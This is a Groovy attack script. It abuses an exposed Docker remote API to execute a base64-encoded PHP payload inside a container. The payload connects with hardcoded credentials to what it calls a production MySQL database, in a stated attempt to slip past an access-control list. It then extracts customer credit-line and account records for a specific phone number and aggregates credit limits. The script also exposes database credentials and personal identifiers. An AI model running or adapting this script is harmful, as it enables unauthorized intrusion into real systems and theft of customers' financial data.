import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def dHost = "172.27.140.148"
def dPort = 4243
def cid = "5b32e909c295"

// Try PROD MySQL from Docker container - different source IP might bypass ACL
def phpB64 = java.util.Base64.encoder.encodeToString('''<?php
error_reporting(E_ALL);
echo "Trying PROD 187.191.91.37...\n";
$c=@new mysqli("187.191.91.37","adaxxidb","JTQ6PrkecY3y1kVN","tienda",3306);
if($c->connect_error){
    echo "PROD_FAIL:".$c->connect_error."\n";
    // Try PROD via internal hostname
    echo "Trying appdb.claroshop-services.net...\n";
    $c2=@new mysqli("appdb.claroshop-services.net","adaxxidb","JTQ6PrkecY3y1kVN","tienda",3306);
    if($c2->connect_error){
        echo "INTERNAL_FAIL:".$c2->connect_error."\n";
        exit(1);
    }
    $c=$c2;
}
echo "CONNECTED as: ".$c->query("SELECT CURRENT_USER()")->fetch_row()[0]."\n";

// Search for credit tables
$r=$c->query("SELECT TABLE_SCHEMA,TABLE_NAME FROM information_schema.TABLES WHERE TABLE_NAME LIKE '%credito%clarotel%' OR TABLE_NAME LIKE '%credcliente%' OR TABLE_NAME LIKE '%lineac%'");
echo "=== CREDIT TABLES ===\n";
if($r && $r->num_rows>0){
    while($row=$r->fetch_row()){echo "$row[0].$row[1]\n";}
}else{echo "NONE\n";}

// If found, query for phone 5558455777
$r2=$c->query("SELECT id_cc_credcliente,id_cliente,telefono,credito_disponible,limite_credito,saldo_credito,numero_cuenta,estatus FROM tienda.credito_clarotel_credcliente WHERE telefono LIKE '%5558455777%' LIMIT 10");
echo "\n=== PHONE 5558455777 credcliente ===\n";
if($r2 && $r2->num_rows>0){
    while($row=$r2->fetch_assoc()){echo implode("|",$row)."\n";}
}else{echo "NO_ROWS / ".$c->error."\n";}

$r3=$c->query("SELECT id_cc_linea,id_cliente,telefono,monto_total,limite_cred_tel,saldo_cred_tel,saldo_sanborns,saldo_sears,saldo_claro,estado_linea FROM tienda.credito_clarotel_lineac WHERE telefono LIKE '%5558455777%' LIMIT 10");
echo "\n=== PHONE 5558455777 lineac ===\n";
if($r3 && $r3->num_rows>0){
    while($row=$r3->fetch_assoc()){echo implode("|",$row)."\n";}
}else{echo "NO_ROWS / ".$c->error."\n";}

// Quick stats
$r4=$c->query("SELECT COUNT(*) as total, SUM(limite_credito) as sum_limite FROM tienda.credito_clarotel_credcliente");
echo "\n=== STATS ===\n";
if($r4 && $r4->num_rows>0){
    $row=$r4->fetch_assoc();
    echo "Total records: ".$row['total']."\n";
    echo "Sum limite_credito: ".$row['sum_limite']."\n";
}else{echo "ERR: ".$c->error."\n";}

$c->close();
?>'''.getBytes("UTF-8"))

def url1 = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def c1 = url1.openConnection()
c1.setRequestMethod("POST")
c1.setDoOutput(true)
c1.setRequestProperty("Content-Type", "application/json")
c1.setConnectTimeout(5000)
c1.setReadTimeout(20000)
def b1 = JsonOutput.toJson([AttachStdout: true, AttachStderr: true, Cmd: ["bash", "-c", "echo ${phpB64} | base64 -d > /tmp/tqprod.php && php /tmp/tqprod.php"]])
c1.outputStream.write(b1.bytes)
c1.outputStream.flush()
def r1 = new JsonSlurper().parseText(c1.inputStream.text)
def eid1 = r1.Id

def su1 = new URL("http://${dHost}:${dPort}/exec/${eid1}/start")
def sc1 = su1.openConnection()
sc1.setRequestMethod("POST")
sc1.setDoOutput(true)
sc1.setRequestProperty("Content-Type", "application/json")
sc1.setConnectTimeout(5000)
sc1.setReadTimeout(30000)
sc1.outputStream.write('{"Detach":false,"Tty":true}'.bytes)
sc1.outputStream.flush()
println sc1.inputStream.text
